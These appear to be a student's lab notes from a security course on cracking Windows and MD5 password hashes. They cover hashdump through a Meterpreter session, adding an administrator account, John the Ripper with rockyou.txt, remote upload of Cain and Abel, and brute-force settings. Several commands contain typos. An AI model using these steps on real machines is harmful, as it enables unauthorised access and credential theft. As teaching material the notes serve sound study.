# Password Cracking
### 3/30/2022

 * Options: John the Reaper or Crack the Password
 * Must always have a valid reverse shell connection
 * Inorder to get the password we need the hash

* Get to the point of "exploit" with the reverseshell session with meterpreter
* Hashes associated with the user are LM Hash (this is old and weak) or NtLM hash (this is newer and stronger)

`background

net localgroup administrator Kristiana /add`
  
### John the Ripper Method  
 `hashdump 
 josh WinHash` *** NOTE: this is a dictionary attack
 `ls`
 
We have the options of format and wordlist John the Ripper

`john Winhash --format=NT
johnWinHash --format=NT --show` Returns "# password hashes cracked, # left" (# is the number)
`gunzip /usr/shar/wordlists/rockyou.txt.gz
cp /usr/shar/wordlists/rockyou.txt ./
ls
johnWinHash --wordlist=rockyou.txt --format=NT` *** NOTE: this added the dictionary file

`john --list=formats` this lists all the formats possile for the file
`john --list=formats |grep MD5` lists the MD5 family of formats

`cp WinHash Winhash2
john WinHash2 --wordlist=rockyou.txt --format=NT`

//assignment practice linuz password cracking 
* Need to create new set of users and passwords
* Create some simple passwords and some strong passwords

* You are not expected to be able to crack all of them
* You can just use the GUIs to make the user with the password 
* Just meant to prove a concept, so you only have to actually crack one or two

* For each task you use the users that you made at the beginning of the assignment
* For the last task with the sample hash passwords you can copy the hash into a test document to make life easier rather than type it out

#### Extra Credit
* Use a different dictionary file (other than rockyou.txt) from the internet

`john md5.txt ` md5.txt is the file with the hash
`rm /root/.j/john.rec` // recovers file
`john md5.txt --format=Raw-MD5`


### Cain and Able Method
* Must transport/upload the executable file to the target machine, create an account to rmote login and finish the installation

#### Attacker side
To Upload:
`upload /root/CYSE301/Module\ IV-Password Cracking ca_setup.exe C:\\` uploads folder to the C-Drive
`ca)stup
execute - f C:\\ca_setup,exe`
* You can execute other programs remotely too


#### New Terminal In Attacker
`rdesktop 192.168.10.9 -u BreakU -p password`
Now run it in the C drive of the target and finish instalation and you will see a cain desktop shortcut
It will then say it can't finish work correctly, click ok and it opens the program

We are going to use a cracker feature
1. *Cracker* tab
2. *LM & NTLM Hashes* option on the left hand side 
* You must select the correct hash you want to crack
3. Click *+* at the top for the add to list function and it will open something click *ok* and it will upload all the user passwords from the ystem
* Opens up a list of all the users and gives you the hashes
* Compare the hashes to the ones from the hashdump that we stored in the file with WinHash
  * *User:PermissionNumber:LMHash:NTHash:::* was what we got from hashdump
4. Dictionary file, click the blank under file and add the path to the desired wordlist
  * You want to use all options other than *Case perms*
5. Click *Start*
6. Will fill in the passwrod in your list as they are cracked
7. Open the *Brute-Force Attack*
8. Change *min*/*max* password length (in this case we are making both 4)
9. Click *Predefined* choose the option you want- it will try to check it will those characters only
10. Click *Start*
* Tells you how long it will run in order to crack it
* Time left is the amount of time it is estimated to go through all the possible combinations
How can we make this faster?
* Use GPU instead of CPU to crack
* Use newer hardware
* Decrease password length
 * the longer and more diverse you password is, the harder it is to crack
